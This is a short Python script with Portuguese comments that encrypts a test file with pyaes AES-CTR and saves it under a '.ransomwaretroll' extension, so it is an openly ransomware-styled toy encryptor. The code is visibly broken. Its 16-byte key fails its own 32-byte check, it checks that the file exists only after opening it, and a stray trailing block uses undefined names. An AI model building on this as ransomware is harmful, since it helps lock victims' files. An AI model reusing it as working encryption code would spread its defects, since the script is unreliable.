import os
import pyaes

def main():
    # Abrir o arquivo a ser criptografado
    file_name = "teste.txt"
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    # Verificar se o arquivo existe
    if not os.path.exists(file_name):
        print("O arquivo não existe.")
        return

    # Verificar se a chave é válida
    key = b"testeransomwares"
    if len(key) != 32:
        print("A chave deve ter 32 bytes.")
        return

    # Criptografar os dados
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    new_file = open(f'{new_file}', "wb")
    new_file.write(crypto_data)
    new_file.close()

if __name__ == "__main__":
    main()

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
